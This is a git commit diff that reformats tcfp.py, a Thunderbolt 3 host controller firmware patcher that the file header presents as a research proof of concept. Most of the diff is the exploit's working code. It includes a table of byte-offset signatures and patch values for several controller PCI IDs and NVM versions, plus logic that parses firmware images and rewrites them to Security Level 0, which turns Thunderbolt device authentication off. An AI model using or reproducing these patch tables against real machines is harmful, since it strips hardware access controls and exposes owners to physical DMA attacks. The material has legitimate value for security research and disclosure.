42eab2eab9e754bdbe771a7861b70d41e86fd02d
Björn Ruytenberg <bjorn@bjornweb.nl>
2020-10-27 18:57:40 +0100

    Initial pep8 cleaning

--- tcfp.py
+++ tcfp.py
@@ -1,17 +1,21 @@
 #!/usr/bin/env python
 # -*- coding: UTF-8 -*-
-#
-# Thunderbolt 3 Host Controller Firmware Patcher (tcfp)
-# Copyright (C) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>
-#
-# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License
-# as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
-# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details. You should have
-# received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.
-#
-# This PoC exploits a Thunderbolt 3 vulnerability that enables unauthenticated overriding of Security Levels by patching host
-# controller firmware. This tool has been released exclusively for research purposes and is not intended for unlawful actions.
+"""
+Thunderbolt 3 Host Controller Firmware Patcher (tcfp)
+Copyright (C) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>
+
+This program is free software: you can redistribute it and/or modify it under the terms of the GNU
+General Public License as published by the Free Software Foundation, either version 3 of the
+License, or (at your option)any later version.
+This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
+even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+General Public License for more details. You should have # received a copy of the GNU General
+Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+This PoC exploits a Thunderbolt 3 vulnerability that enables unauthenticated overriding of
+Security Levels by patching host controller firmware. This tool has been released exclusively for
+research purposes and is not intended for unlawful actions.
+"""
 
 import sys
 import logging
@@ -43,81 +47,120 @@ slSigs = [
     # NVM 33
     {'pci-id': 0x15da,
      'sl': 0,
-     'sig':  [{'offset': 0x800, 'value': b'\x18'}],
+     'sig': [{'offset': 0x800, 'value': b'\x18'}],
      'patch': None
      },
     {'pci-id': 0x15da,
      'sl': 1,
-     'sig':  [{'offset': 0x800, 'value': b'\x19'}],
+     'sig': [{'offset': 0x800, 'value': b'\x19'}],
      'patch': [{'offset': 0x800, 'value': b'\x18'}]
      },
     {'pci-id': 0x15da,
      'sl': 2,
-     'sig':  [{'offset': 0x800, 'value': b'\x1A'}],
+     'sig': [{'offset': 0x800, 'value': b'\x1A'}],
      'patch': [{'offset': 0x800, 'value': b'\x18'}]
      },
     {'pci-id': 0x15da,
      'sl': 3,
-     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x40'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}]
+     'sig': [
+        {'offset': 0x0, 'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'},
+        {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x40'}],
+     'patch': [
+        {'offset': 0x0,
+        'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+        {'offset': 0x800, 'value': b'\x18'}]
      },
     {'pci-id': 0x15da,
      'sl': 3,
-     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x20'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'},
-               {'offset': 0x1000, 'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'}, {'offset': 0x1800, 'value': b'\xFF'}, {'offset': 0x2008, 'value': b'\x37'}]
+     'sig': [
+         {'offset': 0x0, 'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'},
+         {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x20'}],
+     'patch': [
+         {'offset': 0x0,
+         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'},
+         {'offset': 0x1000,
+         'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'},
+         {'offset': 0x1800, 'value': b'\xFF'}, {'offset': 0x2008, 'value': b'\x37'}]
      },
     # NVM 41
     {'pci-id': 0x15d3,
      'sl': 0,
-     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
+     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
      'patch': None
      },
     {'pci-id': 0x15d3,
      'sl': 1,
-     'sig':  [{'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x19'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
+     'sig': [{'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x19'}],
+     'patch': [
+         {'offset': 0x0,
+         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
      },
     {'pci-id': 0x15d3,
      'sl': 2,
-     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1A'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
-               {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'}, {'offset': 0x1000, 'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'}]
+     'sig': [
+         {'offset': 0x0, 'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'},
+         {'offset': 0x1800, 'value': b'\x1A'}],
+     'patch': [
+         {'offset': 0x0,
+         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
+         {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'},
+         {'offset': 0x1000,
+         'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'}]
      },
     {'pci-id': 0x15d3,
      'sl': 3,
-     'sig':  [{'offset': 0x1000, 'value': b'\x00'}, {'offset': 0x1800, 'value': b'\x1B'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
-               {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'}, {'offset': 0x1000,
-                                                                 'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'},
-               {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'}, {'offset': 0x1A98, 'value': b'\xFF\xFF\xFF\xFF'}]
+     'sig': [{'offset': 0x1000, 'value': b'\x00'}, {'offset': 0x1800, 'value': b'\x1B'}],
+     'patch': [
+         {'offset': 0x0,
+         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
+         {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'},
+         {'offset': 0x1000,
+         'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'},
+         {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'},
+         {'offset': 0x1A98, 'value': b'\xFF\xFF\xFF\xFF'}]
      },
     # NVM 28
     {'pci-id': 0x15d3,
      'sl': 1,
-     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
+     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
      'patch': []
      },
     # NVM 36
     {'pci-id': 0x15ea,
      'sl': 0,
-     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
+     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
      'patch': None
      },
     {'pci-id': 0x15ea,
      'sl': 1,
-     'sig':  [{'offset': 0x0,   'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
+     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
      'patch': [{'offset': 0x800, 'value': b'\x18'}]
      },
     {'pci-id': 0x15ea,
      'sl': 2,
-     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1A'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
+     'sig': [
+         {'offset': 0x0, 'value': b'\xFF'},
+         {'offset': 0x800, 'value': b'\xFF'},
+         {'offset': 0x1800, 'value': b'\x1A'}],
+     'patch': [
+         {'offset': 0x0,
+         'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
      },
     {'pci-id': 0x15ea,
      'sl': 3,
-     'sig':  [{'offset': 0x0,   'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x1B'}],
-     'patch': [{'offset': 0x0,   'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'}, {'offset': 0x800, 'value': b'\x18'}]
+     'sig': [
+         {'offset': 0x0, 'value': b'\xFF'},
+         {'offset': 0x800, 'value': b'\xFF'},
+         {'offset': 0x1800, 'value': b'\x1B'}],
+     'patch': [
+         {'offset': 0x0,
+         'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
+         {'offset': 0x800, 'value': b'\x18'}]
      },
 ]
 
@@ -158,10 +201,10 @@ class Image:
                 potentiallyMatchingSigs.append(sig)
         return potentiallyMatchingSigs
 
-    def _getDeviceNameByPciId(self, id):
+    def _getDeviceNameByPciId(self, devid):
         for device in pciIds:
-            if id in device:
-                return device[id]
+            if devid in device:
+                return device[devid]
         return "N/A"
 
     def _getOffsetByParm(self, parm):
@@ -177,8 +220,8 @@ class Image:
             raise Exception("File size smaller than " + str(MIN_VALID_FILESIZE) +
                             " bytes. Image probably corrupted. Aborting.")
         elif size > MAX_VALID_FILESIZE:
-            logging.warning("File size exceeds " + str(MAX_VALID_FILESIZE) +
-                            " bytes. Controller may be unsupported.")
+            logging.warning("File size exceeds %s bytes. Controller may be unsupported.",\
+                 str(MAX_VALID_FILESIZE))
 
         # PCI metadata
         pos = self._getOffsetByParm("pci-id")
@@ -189,8 +232,8 @@ class Image:
         if self.PciDevName != "N/A":
             self.SupportedPciId = True
         else:
-            logging.warning("Unrecognized PCI ID: '" +
-                            str(hex(self.PciId)) + "'. Patching not supported.")
+            logging.warning("Unrecognized PCI ID: '%s'. Patching not supported.",\
+                str(hex(self.PciId)))
 
         # Find DROM entries
         pos = self._getOffsetByParm("entries-len")
@@ -199,8 +242,8 @@ class Image:
 
         # DROM entries sanity check
         if entriesLen > MAX_VALID_DROM_ENTRIES_LEN:
-            logging.warning("Image declares unlikely large DROM entries section (" + str(
-                entriesLen) + "). Capping to " + str(MAX_VALID_DROM_ENTRIES_LEN) + ".")
+            logging.warning("Image declares unlikely large DROM entries section (%s). Capping to \
+                %s.", str(entriesLen), str(MAX_VALID_DROM_ENTRIES_LEN))
             entriesLen = MAX_VALID_DROM_ENTRIES_LEN
 
         pos = self._getOffsetByParm("vendor-id")
@@ -284,14 +327,14 @@ class Image:
                         return i
 
             if len(potentiallyMatchingSigs) == 0:
-                logging.warning("PCI ID '" + str(hex(self.PciId)) +
-                                "' has no known signatures. Ignoring PCI ID and trying all patterns instead.")
+                logging.warning("PCI ID '%s' has no known signatures. Ignoring PCI ID and trying "\
+                    "all patterns instead.", str(hex(self.PciId)))
             else:
-                logging.warning("No matching SL patterns for PCI ID '" + str(
-                    hex(self.PciId)) + "'. Ignoring PCI ID and trying all patterns instead.")
+                logging.warning("No matching SL patterns for PCI ID '%s'. Ignoring PCI ID and "\
+                    "trying all patterns instead.", str(hex(self.PciId)))
 
-            # We did not recognize the PCI ID, or we do, but failed to match SL against its known signatures.
-            # Try matching against signatures for other devices.
+            # We did not recognize the PCI ID, or we do, but failed to match SL against its \
+            # known signatures. Try matching against signatures for other devices.
             for i in range(SL_MAX_NUM):
                 # pci-id == 0 -> ignore PCI ID
                 potentiallyMatchingSigs = self._getSigsByPciIdAndSl(
@@ -315,7 +358,7 @@ class Image:
 
             logging.warning("No matching SL patterns found.")
             return -1
-        except Exception as e:
+        except Exception as e: # pylint: disable=broad-except
             print("Cannot parse Security Level: ", e)
             return -1
 
@@ -355,24 +398,29 @@ class Patcher:
     @staticmethod
     def PatchImage(image, targetSl):
         assert targetSl == 0, "Only SL0 is currently supported."
-        assert image.ValidImage == True, "Not a valid firmware image, and this should have been caught in image.ParseImage."
+        assert image.ValidImage == True, "Not a valid firmware image, and this should have been "\
+            "caught in image.ParseImage."
 
         if image.SecurityLevel == -1 and image.SupportedPciId == False:
             raise Exception(
                 "PCI ID unsupported and unable to parse current SL. Aborting.")
         if image.SecurityLevel == -1 and image.SupportedPciId == True:
             raise Exception(
-                "PCI ID supported, but unable to parse current SL (different NVM version?). Aborting.")
+                "PCI ID supported, but unable to parse current SL (different NVM version?). "\
+                    "Aborting.")
         if image.SecurityLevel != -1 and image.SupportedPciId == False:
             if len(image.MatchingSlSig["patch"]) > 0:
                 logging.warning(
-                    "PCI ID unsupported, but current SL detected through heuristics. Patching may fail.")
+                    "PCI ID unsupported, but current SL detected through heuristics. Patching may "\
+                        "fail.")
             else:
                 raise Exception(
-                    "PCI ID unsupported, but current SL detected through heuristics. No patch pattern available for this SL signature. Aborting.")
+                    "PCI ID unsupported, but current SL detected through heuristics. No patch "\
+                        "pattern available for this SL signature. Aborting.")
         if image.SecurityLevel == 0:
             raise Exception("Current SL is already 0. No need to patch.")
-        if image.SecurityLevel != -1 and image.SupportedPciId == True and len(image.MatchingSlSig["patch"]) == 0:
+        if image.SecurityLevel != -1 and image.SupportedPciId == True \
+            and len(image.MatchingSlSig["patch"]) == 0:
             raise Exception(
                 "PCI ID supported, but no patch pattern available for this SL signature. Aborting.")
 
@@ -392,17 +440,21 @@ def swap(x, len):
 
 def printHelp():
     print("Thunderbolt 3 Host Controller Firmware Patcher", os.linesep,
-          "(c) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>. Licensed under GPLv3.", os.linesep, os.linesep,
+          "(c) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>. Licensed under GPLv3.", os.linesep, \
+              os.linesep,
           "Usage:", os.linesep, os.linesep,
           "parse [file]\t\tParse firmware image metadata and Security Level.", os.linesep,
-          "patch [file]\t\tPatch firmware image to override Security Level to SL0 (no security).", os.linesep,
+          "patch [file]\t\tPatch firmware image to override Security Level to SL0 (no security).", \
+              os.linesep,
           "version\t\tShow program's version number and exit.", os.linesep,
           "help\t\t\tShow this help message.")
 
 
 def printVersion():
     print(
-        "Thunderbolt 3 Host Controller Firmware Patcher {1}{0}(c) 2020 Björn Ruytenberg{0}https://thunderspy.io{0}{0}Licensed under GNU GPLv3 or later <http://gnu.org/licenses/gpl.html>.".format(os.linesep, TCFP_VERSION))
+        "Thunderbolt 3 Host Controller Firmware Patcher {1}{0}(c) 2020 Björn Ruytenberg{0}"\
+            "https://thunderspy.io{0}{0}Licensed under GNU GPLv3 or later"\
+            "<http://gnu.org/licenses/gpl.html>.".format(os.linesep, TCFP_VERSION))
 
 
 def main():
@@ -428,7 +480,7 @@ def main():
                 Patcher.PatchImage(image, 0)
                 print("Image patched succesfully.")
 
-        except Exception as e:
+        except Exception as e: # pylint: disable=broad-except
             print("Error while processing firmware image: ", e)
     elif len(sys.argv) >= 2:
         print("Unknown argument(s) given.")
